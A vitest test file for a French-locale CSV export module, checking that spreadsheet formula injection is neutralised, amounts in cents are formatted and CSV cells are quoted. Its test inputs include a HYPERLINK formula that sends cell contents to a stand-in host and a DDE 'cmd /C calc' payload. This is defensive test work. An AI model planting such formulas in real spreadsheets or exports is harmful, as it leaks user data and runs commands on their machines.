import { describe, expect, it } from 'vitest'
import { amount, csvAmount, csvText, text, toCsv } from './csv'

describe('csvText', () => {
  it.each([
    [
      '=HYPERLINK("https://exemple.test/?d="&A1;"Voir")',
      `"'=HYPERLINK(""https://exemple.test/?d=""&A1;""Voir"")"`,
    ],
    ['+33 VIREMENT TEST', `"'+33 VIREMENT TEST"`],
    ["-2+3+cmd|' /C calc'!A0", `"'-2+3+cmd|' /C calc'!A0"`],
    ['@SUM(1;1)', `"'@SUM(1;1)"`],
    ['\t=1+1', `"'\t=1+1"`],
    ['\r=1+1', `"'\r=1+1"`],
  ])('neutralises %j', (value, expected) => {
    expect(csvText(value)).toBe(expected)
  })

  it('leaves ordinary text alone and still quotes `;`, `"` and line breaks', () => {
    expect(csvText('MAGASIN TEST')).toBe('MAGASIN TEST')
    expect(csvText('2026-10-18 =SOMME(A1)')).toBe('2026-10-18 =SOMME(A1)')
    expect(csvText('Note; avec "guillemets"')).toBe(
      '"Note; avec ""guillemets"""',
    )
    expect(csvText('ligne 1\nligne 2')).toBe('"ligne 1\nligne 2"')
    expect(csvText('')).toBe('')
  })
})

describe('csvAmount', () => {
  it('writes cents with a decimal comma and keeps the minus sign', () => {
    expect(csvAmount(-123_456)).toBe('-1234,56')
    expect(csvAmount(-5)).toBe('-0,05')
    expect(csvAmount(5)).toBe('0,05')
    expect(csvAmount(0)).toBe('0,00')
    expect(csvAmount(null)).toBe('')
  })

  it('refuses anything that is not integer cents', () => {
    expect(() => csvAmount(12.5)).toThrow(RangeError)
  })
})

describe('toCsv', () => {
  it('joins cells with `;` and ends every line with CRLF', () => {
    expect(
      toCsv([
        [text('Exceptionnel'), text('=1+1'), amount(-60_000)],
        [text('Total'), text('Dépenses'), amount(null)],
      ]),
    ).toBe(`Exceptionnel;"'=1+1";-600,00\r\nTotal;Dépenses;\r\n`)
  })
})
